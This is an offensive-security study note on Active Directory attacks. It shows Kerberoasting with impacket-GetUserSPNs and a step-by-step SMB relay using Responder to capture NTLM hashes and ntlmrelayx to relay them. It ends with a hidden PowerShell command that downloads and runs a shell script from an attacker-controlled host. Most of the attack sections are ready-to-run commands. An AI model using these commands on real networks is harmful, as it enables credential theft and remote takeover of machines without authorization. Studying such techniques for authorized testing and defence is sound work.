**Active Directory** (AD) is a directory service developed by Microsoft for managing and organizing information about network resources, such as computers, users, and devices, within a Windows network environment. It serves as a centralized database that enables administrators to efficiently and securely manage and authenticate users, computers, and other network elements.

Useful video: https://www.youtube.com/watch?v=-bNb4hwgkCo&t=1s
# Kerberoasting
It is a method used to extract and crack service account passwords that utilize Kerberos authentication within a Windows Active Directory environment. This attack targets accounts with Kerberos Service Principal Names (SPNs) set, allowing attackers to request encrypted service tickets from the domain controller.
- One method that can be used is using 'impacket-GetUserSPNs'. If we have a user with a username ended in *TGS* that means that is part of a TICKET GRANTING SERVICE. We can use this to ask a ticket to the Domain Controller.
```bash
impacket-GetUserSPNs -request -dc-ip target_ip domain_name/user
```

# SMB Relay

**SMB Relay** is a type of attack that targets the Server Message Block (SMB) protocol used primarily for providing shared access to files, printers, and serial ports in a network.

The attack involves intercepting and relaying SMB authentication attempts to another SMB server, allowing an attacker to gain unauthorized access or execute commands with the victim's credentials.

## Key Concepts

1. **SMB (Server Message Block) Protocol**:
    
    - A network protocol used for sharing files, printers, and serial ports.
    - Operates over TCP/IP using ports 139 and 445.
2. **NTLM (NT LAN Manager) Authentication**:
    
    - A suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users.
    - SMB often uses NTLM for authentication.
3. **Relay Attack**:
    
    - An attacker intercepts the authentication process.
    - Instead of cracking the intercepted credentials, the attacker relays them to another server to authenticate.

## Attack Process

1. **Configuring Responder**:
- Modify the `Responder.conf` configuration file to enable or disable specific protocols. For SMB relay, ensure that SMB and HTTP are set to `On` and that `HTTP Server` is also enabled.
```java
sudo nano /etc/responder/Responder.conf
```
2. **Intercept**:
- The attacker sets up a malicious SMB server to intercept authentication attempts.
- The attacker needs to position themselves in the network to intercept SMB traffic (Man-in-the-Middle), this can be done with *Responder*.
```java
python3 Responder.py -I <interface> -rdw
```
3. **Cracking hashes**:
- After some time different user hashes would be captured by the Responder. All this hashes can be cracked using tools as *John* or *Hashcat* before executing the relay. 

4. **Setting Up SMB Relay with Impacket**:
- Create a `targets.txt` file that contains the IP addresses of the target servers you want to relay the credentials to.
- Use Impacket's **ntlmrelayx.py** script to relay the captured credentials to another target server.
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
5. **Gaining access**:
- Create a simple reverse shell payload that can be executed on the target host. For example, using PowerShell for a Windows target:
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"
```
	
-  Host the `shell.ps1` script on your attacker machine (e.g., using a simple HTTP server).
```bash
python3 -m http.server 80
```
- Run NTLMRelayx.py with the Reverse Shell Command:
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')\""
```